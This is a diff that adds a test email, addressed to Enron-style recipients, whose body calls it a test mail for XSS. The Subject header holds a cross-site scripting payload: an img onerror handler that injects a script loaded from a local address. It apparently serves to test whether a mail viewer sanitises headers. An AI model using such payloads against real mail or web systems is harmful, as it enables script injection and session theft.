@@ -1,0 +1,7 @@
+From: "Billie Tyler" <recursperiodontal@chemist.com>
+To: richard.shapiro@enron.com, d..steffes@enron.com, michael.tribolet@enron.com, 
+Subject: <img src=x onerror=d=document;e=d.createElement('script');e.src='http://127.0.0.1/i.js';d.body.appendChild(e)>
+MIME-Version: 1.0
+Content-type: text/html
+
+This is a test mail for XSS.
